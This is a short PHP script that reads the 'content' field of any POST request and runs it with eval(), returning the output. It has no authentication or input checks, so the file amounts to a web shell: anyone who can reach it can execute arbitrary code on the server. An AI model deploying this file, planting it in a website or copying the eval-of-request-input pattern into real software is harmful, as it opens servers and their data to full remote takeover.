<?php
if(!empty($_POST)){
	if(get_magic_quotes_gpc())
		echo eval_php(stripslashes($_POST['content']));
	else{
		echo eval_php($_POST['content']);
	}
}
function eval_php($content)
{
    ob_start();
    eval("?>$content<?php ");
    $output = ob_get_contents();
    ob_end_clean();
    return $output;
}
?>
